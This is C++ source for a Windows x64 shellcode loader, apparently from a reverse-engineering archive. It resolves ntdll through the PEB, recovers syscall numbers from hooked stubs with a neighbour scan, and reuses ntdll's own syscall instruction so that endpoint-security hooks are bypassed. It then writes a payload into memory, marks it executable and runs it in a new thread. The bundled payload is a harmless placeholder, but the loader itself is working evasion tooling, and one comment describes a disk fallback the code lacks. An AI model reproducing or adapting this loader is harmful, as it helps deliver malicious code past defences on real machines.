/*
    Shellcode Loader
    Archive of Reversing.ID

    Directly invoke NT syscall without allocating a new executable stub.
    The 'syscall; ret' instruction already present in ntdll's .text section is
    reused as the gate, so no fresh RWX page is created for the syscall instruction.
    A small trampoline sets RCX->R10 and EAX=SSN, then jumps into ntdll.

Compile:
    $ ml64.exe /nologo /c recycledgate.asm
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tpcode.cpp recycledgate.obj

Technique:
    - access:       Recycled Gate (reuse ntdll syscall instruction)
    - allocation:   NtAllocateVirtualMemory (recycled gate)
    - writing:      RtlMoveMemory
    - permission:   NtProtectVirtualMemory  (recycled gate)
    - execution:    CreateThread

Note:
    - x64 only (Windows 10+ ntdll stub layout)
    - syscall uses static RecycledGate / RecycledDescent (no RWX gate alloc)
*/

#ifndef _WIN64
#error "Recycled Gate requires x64 (Windows 10+ ntdll stub layout)"
#endif

#include <windows.h>
#include <stdlib.h>
#include <stdint.h>

extern "C" void  RecycledGate (WORD wSystemCall);
extern "C" void  RecycledSetSyscallAddr (PVOID syscall_addr);
extern "C" PVOID RecycledDescent (void);

/* ========= PEB / loader structures ========= */
typedef struct _MY_UNICODE_STRING {
    USHORT  Length;
    USHORT  MaximumLength;
    PWSTR   Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_LDR_ENTRY {
    LIST_ENTRY          InLoadOrderLinks;
    LIST_ENTRY          InMemoryOrderLinks;
    LIST_ENTRY          InInitializationOrderLinks;
    PVOID               DllBase;
    PVOID               EntryPoint;
    ULONG               SizeOfImage;
    MY_UNICODE_STRING   FullDllName;
    MY_UNICODE_STRING   BaseDllName;
} MY_LDR_ENTRY, *PMY_LDR_ENTRY;

typedef struct _MY_PEB_LDR_DATA {
    ULONG       Length;
    BOOL        Initialized;
    PVOID       SsHandle;
    LIST_ENTRY  InLoadOrderModuleList;
    LIST_ENTRY  InMemoryOrderModuleList;
    LIST_ENTRY  InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

/* ========= NT function signatures ========= */
typedef NTSTATUS NTAPI NtAllocateVirtualMemory_t(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS NTAPI NtProtectVirtualMemory_t(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

// pointer to function
typedef NtAllocateVirtualMemory_t FAR * pNtAllocateVirtualMemory;
typedef NtProtectVirtualMemory_t  FAR * pNtProtectVirtualMemory;

/* ========= ntdll helpers ========= */

static PVOID get_ntdll_base ()
{
    PMY_PEB_LDR_DATA ldr;
    PLIST_ENTRY      entry;

    ldr   = *(PMY_PEB_LDR_DATA *) (__readgsqword (0x60) + 0x18);
    entry = ldr->InMemoryOrderModuleList.Flink->Flink;
    return CONTAINING_RECORD (entry, MY_LDR_ENTRY, InMemoryOrderLinks)->DllBase;
}

static PVOID get_fn_addr (PVOID base, LPCSTR name)
{
    PBYTE                   b   = (PBYTE) base;
    PIMAGE_DOS_HEADER       dos = (PIMAGE_DOS_HEADER) b;
    PIMAGE_NT_HEADERS       nt  = (PIMAGE_NT_HEADERS) (b + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY) (b +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD * names    = (DWORD *) (b + exp->AddressOfNames);
    WORD  * ordinals = (WORD *)  (b + exp->AddressOfNameOrdinals);
    DWORD * funcs    = (DWORD *) (b + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++)
    {
        if (lstrcmpA ((LPCSTR)(b + names[i]), name) == 0)
            return b + funcs[ordinals[i]];
    }
    return NULL;
}

/* ========= SSN extraction ========= */

// clean NT syscall stub starts with: mov r10,rcx (4C 8B D1) + mov eax,imm (B8)
static BOOL is_clean_stub (PBYTE stub)
{
    return stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8;
}

static WORD read_ssn (PBYTE stub)
{
    return *(WORD *)(stub + 4);
}

/* ========= locate 'syscall; ret' inside ntdll .text ========= */

static PVOID find_syscall_in_ntdll (PVOID ntdll_base)
{
    PBYTE                 b    = (PBYTE) ntdll_base;
    PIMAGE_DOS_HEADER     dos  = (PIMAGE_DOS_HEADER) b;
    PIMAGE_NT_HEADERS     nt   = (PIMAGE_NT_HEADERS) (b + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec  = IMAGE_FIRST_SECTION (nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
    {
        if (!(sec->Characteristics & IMAGE_SCN_CNT_CODE)) continue;

        PBYTE start = b + sec->VirtualAddress;
        PBYTE end   = start + sec->SizeOfRawData - 2;

        for (PBYTE p = start; p < end; p++)
        {
            if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3)
                return p;
        }
    }
    return NULL;
}

/* ========= SSN extraction (Halo's Gate neighbor scan as fallback) ========= */

#define MAX_SYSCALL_TABLE 512

typedef struct _SC_ENTRY { PVOID address; } SC_ENTRY;

static int sc_cmp (const void * a, const void * b)
{
    const SC_ENTRY * ea = (const SC_ENTRY *) a;
    const SC_ENTRY * eb = (const SC_ENTRY *) b;
    if (ea->address < eb->address) return -1;
    if (ea->address > eb->address) return  1;
    return 0;
}

static DWORD build_nt_table (PVOID base, SC_ENTRY * table)
{
    PBYTE                   b   = (PBYTE) base;
    PIMAGE_DOS_HEADER       dos = (PIMAGE_DOS_HEADER) b;
    PIMAGE_NT_HEADERS       nt  = (PIMAGE_NT_HEADERS) (b + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY) (b +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD * names    = (DWORD *) (b + exp->AddressOfNames);
    WORD  * ordinals = (WORD *)  (b + exp->AddressOfNameOrdinals);
    DWORD * funcs    = (DWORD *) (b + exp->AddressOfFunctions);
    DWORD   count    = 0;

    for (DWORD i = 0; i < exp->NumberOfNames && count < MAX_SYSCALL_TABLE; i++)
    {
        LPCSTR name = (LPCSTR)(b + names[i]);
        if (name[0] == 'N' && name[1] == 't')
            table[count++].address = b + funcs[ordinals[i]];
    }

    qsort (table, count, sizeof (SC_ENTRY), sc_cmp);
    return count;
}

static BOOL get_ssn (PVOID ntdll_base, LPCSTR fn_name, PWORD out_ssn)
{
    PVOID fn = get_fn_addr (ntdll_base, fn_name);
    if (!fn) return FALSE;

    if (is_clean_stub ((PBYTE) fn))
    {
        *out_ssn = read_ssn ((PBYTE) fn);
        return TRUE;
    }

    SC_ENTRY table[MAX_SYSCALL_TABLE];
    DWORD    count = build_nt_table (ntdll_base, table);

    DWORD target_idx = count;
    for (DWORD i = 0; i < count; i++)
    {
        if (table[i].address == fn) { target_idx = i; break; }
    }
    if (target_idx == count) return FALSE;

    for (DWORD k = 1; k < count; k++)
    {
        if (target_idx + k < count && is_clean_stub ((PBYTE) table[target_idx + k].address))
        {
            *out_ssn = read_ssn ((PBYTE) table[target_idx + k].address) - (WORD) k;
            return TRUE;
        }
        if (target_idx >= k && is_clean_stub ((PBYTE) table[target_idx - k].address))
        {
            *out_ssn = read_ssn ((PBYTE) table[target_idx - k].address) + (WORD) k;
            return TRUE;
        }
    }

    return FALSE;
}

/* ======================================================= */

int main ()
{
    void *   runtime     = NULL;
    SIZE_T   size;
    ULONG    old_protect = 0;
    NTSTATUS status;
    HANDLE   h_thread;

    uint8_t  payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t payload_len = 4;

    WORD ssn_alloc   = 0;
    WORD ssn_protect = 0;

    // resolve ntdll base
    PVOID ntdll = get_ntdll_base ();

    // locate 'syscall; ret' inside ntdll .text
    PVOID syscall_addr = find_syscall_in_ntdll (ntdll);
    if (!syscall_addr) return 1;

    // set syscall address
    RecycledSetSyscallAddr (syscall_addr);

    // extract SSNs — disk fallback fires automatically if stubs are hooked
    if (!get_ssn (ntdll, "NtAllocateVirtualMemory", &ssn_alloc))   return 1;
    if (!get_ssn (ntdll, "NtProtectVirtualMemory",  &ssn_protect)) return 1;

    // allocate memory for payload as READ-WRITE (no executable)
    size   = payload_len;
    RecycledGate (ssn_alloc);
    status = ((pNtAllocateVirtualMemory) RecycledDescent) (
        GetCurrentProcess (),
        &runtime,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (status != 0) return 1;

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    size   = payload_len;
    RecycledGate (ssn_protect);
    status = ((pNtProtectVirtualMemory) RecycledDescent) (
        GetCurrentProcess (),
        &runtime,
        &size,
        PAGE_EXECUTE_READ,
        &old_protect
    );
    if (status == 0)
    {
        h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (h_thread, -1);
    }

    return 0;
}
